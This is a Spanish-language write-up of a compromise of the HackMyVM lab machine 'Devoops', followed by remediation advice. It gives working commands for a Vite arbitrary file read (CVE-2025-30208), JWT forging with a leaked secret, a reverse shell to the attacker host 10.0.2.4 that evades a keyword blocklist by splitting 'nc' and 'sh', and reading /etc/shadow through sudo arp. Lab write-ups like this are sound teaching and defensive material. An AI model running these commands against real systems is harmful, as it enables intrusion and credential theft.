01 — Resumen Ejecutivo

Resumen Ejecutivo

La máquina Devoops (HackMyVM) expone un único servicio HTTP en el puerto 3000/tcp — un servidor de desarrollo Vite 6.2 + Vue.js con un backend Express.js en localhost:3001. La superficie de ataque es reducida pero la cadena de explotación es completa, partiendo de una vulnerabilidad de lectura arbitraria de ficheros (CVE-2025-30208) hasta obtener una shell como root.

El vector principal aprovecha que el servidor Vite en modo desarrollo sirve cualquier fichero del sistema de archivos al añadir el parámetro ?raw?? a la URL. Esto expone el fichero .env con el secreto JWT, permitiendo forjar tokens de administrador y ejecutar comandos arbitrarios en el sistema a través del endpoint /execute, bypasseando el filtro de comandos mediante concatenación de cadenas.

La escalada a root se consigue en dos saltos: recuperación de una clave SSH privada de un commit git eliminado en Gitea, y explotación del permiso sudo arp para leer /etc/shadow y crackear la contraseña de root.

04 — Vulnerabilidades Identificadas

Vulnerabilidades Identificadas

1
Vite Arbitrary File Read
CVE-2025-30208 — Vite <= 6.2.2
● Crítico
Componente afectado
Vite Dev Server — modo desarrollo
Vector
HTTP — parámetro ?raw??
Impacto
Lectura arbitraria de ficheros del sistema (root del filesystem)
Archivos expuestos
/etc/passwd, .env, server.js

El servidor Vite en modo desarrollo (vite dev) no valida correctamente las rutas de ficheros cuando se añade el sufijo ?raw?? a la URL. Esto permite a cualquier cliente sin autenticación leer cualquier fichero accesible por el proceso de Node.js, incluyendo ficheros fuera del directorio de trabajo.

bash — Explotación
# Leer /etc/passwd
curl 'http://10.0.2.12:3000/etc/passwd?raw??'
→ root:x:0:0:root:/root:/bin/sh
→ runner:x:1000:1000:::/bin/sh
→ hana:x:1001:100::/home/hana:/bin/sh

# Leer .env — JWT_SECRET expuesto
curl 'http://10.0.2.12:3000/.env?raw??'
→ JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'
→ COMMAND_FILTER='nc,python,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'

# Leer server.js — código fuente del backend
curl 'http://10.0.2.12:3000/server.js?raw??'
→ Código fuente completo del API (rutas, lógica de autenticación, filtros)
2
JWT Forjado — Remote Code Execution
JWT Secret Exposure → Authenticated RCE
● Crítico
Componente afectado
Endpoint /execute (Express API)
Pre-requisito
JWT_SECRET obtenido por CVE-2025-30208
Impacto
Ejecución de comandos OS como usuario runner
Bypass del filtro
Concatenación de cadenas (n""c, s""h)

Con el JWT_SECRET extraído del fichero .env, se forjó un token JWT con rol admin. El endpoint /execute?cmd= ejecuta comandos de sistema operativo. El filtro de comandos bloqueado se evade mediante concatenación de strings en bash (n""c → nc), técnica que no es detectada por la expresión regular del servidor.

bash — Explotación RCE
# Generar JWT admin con el secret extraído
python3 -c "import jwt,time; print(jwt.encode({'uid':0,'role':'admin','iat':int(time.time())}, '2942szKG7Ev83aDviugAa6rFpKixZzZz', 'HS256'))"
→ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsIn...

# Verificar RCE
curl -H "Authorization: Bearer <TOKEN>" "http://10.0.2.12:3000/execute?cmd=id"
→ {"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner)..."}}

# Reverse shell — bypass filtro con concatenación de strings
# "nc" bloqueado → "n""c" permitido; "sh" bloqueado → "s""h" permitido
curl -H "Authorization: Bearer <TOKEN>" "http://10.0.2.12:3000/execute?cmd=n%22%22c+10.0.2.4+1234+-e+s%22%22h"
→ Reverse shell recibida como runner (uid=1000)

Clave SSH Privada en Historial Git
Sensitive Data Exposure — Git History
● Alto
Componente afectado
Repositorio Gitea — /opt/gitea/git/hana/node.git
Datos expuestos
Clave privada ED25519 de usuario hana

Un commit de Gitea titulado "del: oops!" eliminó una clave SSH privada que había sido añadida accidentalmente al repositorio en el commit anterior. Aunque el fichero fue borrado, el contenido permanece en el historial de git y es recuperable con git show. Esta clave permite autenticarse como el usuario hana por SSH (tras port-forward del puerto 22 interno).

# Ver commits
git --git-dir=/tmp/dotgit log --oneline
1994a70 del: oops!
02c0f91 init: init commit

# Extraer la clave del commit de borrado
git --git-dir=/tmp/dotgit show 1994a70

----- END OPENSSH PRIVATE KEY -----

# Port-forward SSH (puerto 22 → 4444) y conexión como hana

4
Privilege Escalation — sudo arp + /etc/shadow
GTFOBins — sudo arp -f (file read) → password crack → root
● Alto
Permiso sudo
(root) NOPASSWD: /sbin/arp
Técnica
GTFOBins: arp -f <file> lee ficheros como root
Hash obtenido
SHA-512crypt ($6$...) de root
Contraseña
eris (en rockyou.txt)

El usuario hana puede ejecutar /sbin/arp como root sin contraseña. El comando arp -v -f <fichero> intenta parsear el fichero como tabla ARP, imprimiendo línea a línea su contenido en la salida de error. Esto permite leer /etc/shadow y obtener el hash de la contraseña de root, que fue crackeado con rockyou.txt.

bash — Escalada a root
# Verificar permisos sudo
sudo -l
→ (root) NOPASSWD: /sbin/arp

# Leer /etc/shadow con sudo arp (GTFOBins)
sudo arp -v -f /etc/shadow 2>&1 | grep root
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKET...

# Crackear hash con John / Hashcat
john --format=sha512crypt --wordlist=rockyou.txt hash.txt
→ eris             (root)

# Escalar a root
su root   → password: eris
→ uid=0(root) gid=0(root) — ROOT ✓

08 — Remediación

Recomendaciones de Remediación

1
No exponer servidores Vite en modo desarrollo en producción
Actualizar Vite a ≥ 6.2.3 (fix de CVE-2025-30208) y nunca ejecutar vite dev en entornos accesibles desde la red. Usar builds de producción (vite build). Si es necesario exponer el dev server, configurar correctamente server.allowedHosts y añadir autenticación.
2
No almacenar secretos en ficheros .env accesibles por el servidor web
El JWT_SECRET en .env fue directamente legible vía la vulnerabilidad de lectura de ficheros. Usar variables de entorno del sistema (no ficheros), servicios de secretos (Vault, AWS Secrets Manager) y nunca exponer .env en el docroot.
3
Limpiar secretos del historial git con git-filter-repo
Usar git filter-repo o BFG Repo-Cleaner para eliminar permanentemente ficheros sensibles del historial. Rotar inmediatamente cualquier credencial que haya sido expuesta. Implementar pre-commit hooks con herramientas como detect-secrets o truffleHog.
4
Revisar y restringir permisos sudo
Eliminar el permiso (root) NOPASSWD: /sbin/arp para el usuario hana. Auditar todos los permisos sudo con sudo -l para cada usuario. Aplicar el principio de mínimo privilegio — consultar GTFOBins para identificar binarios peligrosos.
5
Mejorar el filtrado de comandos con allowlisting
El filtro de comandos basado en blacklist con regex de palabras clave es trivialmente evadible. Reemplazar por un modelo de allowlist estricto que solo permita comandos específicos y con parámetros validados. Considerar sandbox (seccomp, AppArmor, contenedores) para el proceso de ejecución.
